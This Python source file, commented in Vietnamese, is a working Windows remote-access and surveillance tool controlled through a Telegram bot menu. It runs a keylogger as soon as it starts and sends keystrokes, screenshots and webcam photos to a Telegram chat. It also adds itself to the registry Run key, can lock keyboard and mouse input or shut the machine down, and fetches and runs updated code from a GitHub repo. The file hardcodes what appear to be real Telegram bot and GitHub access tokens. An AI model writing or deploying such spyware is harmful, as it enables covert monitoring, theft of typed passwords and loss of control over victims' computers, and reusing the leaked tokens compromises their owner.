import os
import sys
import platform
import subprocess
import time
import threading
import psutil
import requests
import pyautogui
import winreg
import urllib.request
from datetime import datetime

# --- CẤU HÌNH BOT & GITHUB PRIVATE REPO ---
TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
ALLOWED_CHAT_ID = "7666107995"
GITHUB_PAT = "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"
UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"

block_active = False
monitoring_active = True
keylogger_data = []

def is_authorized(chat_id):
    return str(chat_id) == str(ALLOWED_CHAT_ID)

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    for _ in range(3):
        try:
            requests.post(url, json=payload, timeout=20)
            return
        except:
            time.sleep(2)

def send_telegram_photo(chat_id, photo_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    for _ in range(3):
        try:
            with open(photo_path, 'rb') as photo:
                files = {"photo": photo}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=30)
                return
        except:
            time.sleep(2)

# --- MENU CHÍNH BUNG LỤA CHI TIẾT TỪNG NÚT ---
def send_telegram_menu(chat_id, message="🔥 *GOD-BOT ĐẦY ĐỦ TÍNH NĂNG - TỐI THƯỢNG*"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [{"text": "📊 Thong so CPU/RAM/Pin", "callback_data": "sysinfo"}, {"text": "🔥 Top Tien trinh CPU", "callback_data": "process"}],
            [{"text": "🖥 Chup man hinh", "callback_data": "screenshot"}, {"text": "📸 Chup Webcam truc tiep", "callback_data": "webcam"}],
            [{"text": "⌨️ Xem Keylogger Log", "callback_data": "get_keylog"}, {"text": "🛡 Bat/Tat Giam sat ngam", "callback_data": "toggle_monitor"}],
            [{"text": "🚀 Tu dong cung Windows", "callback_data": "set_startup"}, {"text": "🔄 Update Online (PAT)", "callback_data": "do_update"}],
            [{"text": "🔒 Khoa cung khan cap", "callback_data": "lock_pc"}, {"text": "🔓 Mo khoa he thong", "callback_data": "unlock_pc"}],
            [{"text": "⚡ Tat nguon (Shutdown)", "callback_data": "shutdown_pc"}, {"text": "🛑 Thoat Bot", "callback_data": "end_bot"}]
        ]
    }
    payload = {"chat_id": chat_id, "text": message, "reply_markup": keyboard, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=15)
    except:
        pass

def answer_callback_query(callback_query_id, text=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_query_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json()
    except:
        return None

# --- MODULES CHUYÊN SÂU ---
def capture_webcam(save_path="webcam.jpg"):
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(save_path, frame)
        cam.release()
        return os.path.exists(save_path)
    except:
        return False

def start_keylogger():
    try:
        import pynput.keyboard as pynput_kb
        def on_press(key):
            global keylogger_data
            try:
                keylogger_data.append(str(key.char))
            except AttributeError:
                keylogger_data.append(f"[{key.name}]")
            if len(keylogger_data) > 500:
                keylogger_data = keylogger_data[-500:]
        with pynput_kb.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass

threading.Thread(target=start_keylogger, daemon=True).start()

# --- UPDATE ONLINE TỪ PRIVATE REPO QUA PAT ---
def self_update(chat_id):
    send_telegram_message(chat_id, "🔄 *Dang ket noi Private Repo qua PAT de tai ban cap nhat...*")
    try:
        headers = {"Authorization": f"token {GITHUB_PAT}"}
        response = requests.get(UPDATE_URL, headers=headers, timeout=30)
        if response.status_code != 200:
            send_telegram_message(chat_id, f"[-] Loi tai code: HTTP {response.status_code}")
            return
        content = response.text
        if "TELEGRAM_BOT_TOKEN" not in content:
            send_telegram_message(chat_id, "[-] Loi: File update khong hop le!")
            return
        new_file_path = "new_bot.py"
        with open(new_file_path, "w", encoding="utf-8") as f:
            f.write(content)
        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang cai dat thu vien va khoi dong lai...*")
        updater_script = "updater.bat"
        with open(updater_script, "w", encoding="utf-8") as f:
            f.write(f"""
@echo off
python -m pip install --upgrade pip > nul
python -m pip install requests psutil pyautogui opencv-python pynput pygetwindow > nul
move /y new_bot.py {os.path.basename(sys.argv[0])}
start pythonw "{os.path.abspath(sys.argv[0])}"
del %0
""")
        subprocess.Popen(updater_script, shell=True)
        os._exit(0)
    except Exception as e:
        send_telegram_message(chat_id, f"[-] Cap nhat that bai: {e}")

# --- GIÁM SÁT TOÀN DIỆN CHẠY NGẦM ---
def smart_surveillance():
    global block_active, monitoring_active
    last_web_capture = 0
    while monitoring_active:
        try:
            if platform.system() == 'Windows':
                for p in psutil.process_iter(['name']):
                    p_name = str(p.info['name']).lower()
                    if any(kw in p_name for kw in ["bluestacks", "hd-player", "nox", "ldplayer", "valorant"]):
                        trigger_lock_permanent(f"Phat hien app cam: {p_name}")
                        break
                try:
                    import pygetwindow as gw
                    active_window = gw.getActiveWindow()
                    if active_window:
                        title = active_window.title.lower()
                        if any(kw in title for kw in ["facebook", "game", "lol", "steam"]):
                            current_time = time.time()
                            if current_time - last_web_capture > 180:
                                last_web_capture = current_time
                                ss_path = "sus_screen.png"
                                wc_path = "sus_webcam.jpg"
                                pyautogui.screenshot().save(ss_path)
                                has_wc = capture_webcam(wc_path)
                                send_telegram_message(ALLOWED_CHAT_ID, f"⚠️ *CANH BAO*: Phat hien `{active_window.title}`")
                                send_telegram_photo(ALLOWED_CHAT_ID, ss_path)
                                if has_wc: send_telegram_photo(ALLOWED_CHAT_ID, wc_path)
                                if os.path.exists(ss_path): os.remove(ss_path)
                                if os.path.exists(wc_path): os.remove(wc_path)
                except:
                    pass
        except:
            pass
        time.sleep(5)

def trigger_lock_permanent(reason):
    global block_active
    if block_active: return
    block_active = True
    ss_path = "lock_screen.png"
    wc_path = "lock_webcam.jpg"
    pyautogui.screenshot().save(ss_path)
    capture_webcam(wc_path)
    send_telegram_message(ALLOWED_CHAT_ID, f"🚨 *KHOA CUNG KHAN CAP*!\n• Ly do: `{reason}`")
    send_telegram_photo(ALLOWED_CHAT_ID, ss_path)
    send_telegram_photo(ALLOWED_CHAT_ID, wc_path)
    if os.path.exists(ss_path): os.remove(ss_path)
    if os.path.exists(wc_path): os.remove(wc_path)
    
    import ctypes
    while block_active:
        try: ctypes.windll.user32.BlockInput(True)
        except: pass
        time.sleep(0.5)

threading.Thread(target=smart_surveillance, daemon=True).start()

# --- XỬ LÝ SỰ KIỆN TỪNG TÍNH NĂNG RIÊNG BIỆT ---
def handle_callback(callback_query):
    global block_active, monitoring_active
    query_id = callback_query["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    if not is_authorized(chat_id):
        answer_callback_query(query_id, text="Cut!")
        return
    data = callback_query["data"]
    answer_callback_query(query_id, text=f"Thuc thi: {data}...")
    
    if data == "sysinfo":
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        battery = psutil.sensors_battery()
        bat_str = f"{battery.percent}%" if battery else "Khong co Pin"
        send_telegram_message(chat_id, f"📊 *Thong so he thong*:\n• CPU: `{cpu}%`\n• RAM: `{ram}%`\n• Pin: `{bat_str}`")
        
    elif data == "process":
        try:
            procs = []
            psutil.cpu_percent(interval=None)
            time.sleep(0.5)
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent']):
                try: procs.append(p.info)
                except: pass
            sorted_procs = sorted(procs, key=lambda x: x['cpu_percent'] or 0.0, reverse=True)[:5]
            msg = "🔥 *Top 5 Tien trinh CPU*:\n"
            for p in sorted_procs:
                msg += f"• `{p['name']}` (PID: {p['pid']}) - `{p['cpu_percent']}%`\n"
            send_telegram_message(chat_id, msg)
        except Exception as e:
            send_telegram_message(chat_id, f"Loi: {e}")
            
    elif data == "screenshot":
        send_telegram_message(chat_id, "🖥️ Dang chup man hinh...")
        try:
            filename = "screenshot.png"
            pyautogui.screenshot().save(filename)
            send_telegram_photo(chat_id, filename, caption="🖥️ [SCREENSHOT] Anh man hinh thiet bi!")
            os.remove(filename)
        except Exception as e:
            send_telegram_message(chat_id, f"Loi: {e}")
            
    elif data == "webcam":
        send_telegram_message(chat_id, "📸 Dang chup anh Webcam...")
        filename = "webcam.jpg"
        if capture_webcam(filename):
            send_telegram_photo(chat_id, filename, caption="📸 [WEBCAM] Anh chup truc tiep!")
            os.remove(filename)
        else:
            send_telegram_message(chat_id, "[-] Khong the truy cap Webcam hoac khong co thiet bi.")
            
    elif data == "get_keylog":
        log_text = "".join(keylogger_data[-200:])
        if not log_text: log_text = "Chua co du lieu phim go."
        send_telegram_message(chat_id, f"⌨️ *Keylogger Log Gan Nhat*:\n`{log_text}`")
        
    elif data == "toggle_monitor":
        monitoring_active = not monitoring_active
        status = "Bat" if monitoring_active else "Tat"
        send_telegram_message(chat_id, f"🛡️ Trang thai giam sat thong minh: *{status}*")
        
    elif data == "set_startup":
        try:
            script_path = os.path.abspath(sys.argv[0])
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "TelegramRemoteBot", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
            winreg.CloseKey(key)
            send_telegram_message(chat_id, "🚀 Da cai dat tu dong khoi dong cung Windows thanh cong!")
        except Exception as e:
            send_telegram_message(chat_id, f"Loi cai dat startup: {e}")
            
    elif data == "do_update":
        threading.Thread(target=self_update, args=(chat_id,)).start()
        
    elif data == "lock_pc":
        threading.Thread(target=trigger_lock_permanent, args=("Lenh thu cong tu Telegram",)).start()
        send_telegram_message(chat_id, "🔒 Da khoa cung chuot va ban phim vinh vien!")
        
    elif data == "unlock_pc":
        block_active = False
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        send_telegram_message(chat_id, "🔓 Da mo khoa he thong thanh cong!")
        
    elif data == "shutdown_pc":
        subprocess.run("shutdown /s /t 0", shell=True)
        send_telegram_message(chat_id, "⚡ Da tat may!")
        
    elif data == "end_bot":
        send_telegram_message(chat_id, "🛑 Dang tat hoan toan Bot...")
        os._exit(0)

def main_loop():
    print("[*] God-Bot day du tinh nang dang chay ngam...")
    offset = None
    while True:
        updates = get_updates(offset)
        if updates and "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1
                if "callback_query" in update:
                    handle_callback(update["callback_query"])
                elif "message" in update and "text" in update["message"]:
                    chat_id = update["message"]["chat"]["id"]
                    if not is_authorized(chat_id): continue
                    text = update["message"]["text"].strip().lower()
                    if text in ["/menu", "/start"]:
                        send_telegram_menu(chat_id)
        time.sleep(1)

if __name__ == '__main__':
    main_loop()
